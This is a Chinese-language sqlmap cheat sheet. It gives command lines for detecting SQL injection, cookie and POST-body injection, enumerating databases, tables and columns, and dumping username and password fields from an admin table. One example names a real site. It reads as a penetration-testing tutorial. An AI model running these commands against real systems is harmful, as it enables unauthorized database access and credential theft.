推荐网站: http://www.91ri.org/6775.html 

当什么都弄不出来的时候：--flush-session --random-agent --level=5 --risk=3 -batch

**检测注入**

**基本格式**

sqlmap -u “http://www.vuln.cn/post.php?id=1”

默认使用level1检测全部数据库类型

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

**cookie注入**

当程序有防get注入的时候，可以使用cookie注入

sqlmap -u “http://www.baidu.com/shownews.asp” --cookie “id=11” --level 2（只有level达到2才会检测cookie）

**从post数据包中注入**

可以使用burpsuite或者temperdata等工具来抓取post包

sqlmap -r “c:\tools\request.txt” -p “username” --dbms mysql    指定username参数

**注入成功后**

**获取数据库基本信息**

**查询有哪些数据库**

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3 --dbs

**查询test数据库中有哪些表**

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3 -D test --tables

**查询test数据库中admin表有哪些字段**

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3 -D test -T admin --columns

**dump出字段username与password中的数据**

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3 -D test -T admin -C “username,password” --dump

**也可以提前用--dump**

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3 -D test -T admin --dump

sqlmap -u “http://www.vuln.cn/post.php?id=1”  --dbms mysql --level 3 -D test --dump

**从数据库中搜索字段**

**在dedecms数据库中搜索字段admin或者password。**

sqlmap -r “c:\tools\request.txt” --dbms mysql -D dedecms --search -C admin,password





**sqlmap的高级用法**

tamper:

http://www.myh0st.cn/index.php/archives/881/

https://xz.aliyun.com/t/2746

•https://www.freebuf.com/sectool/179035.html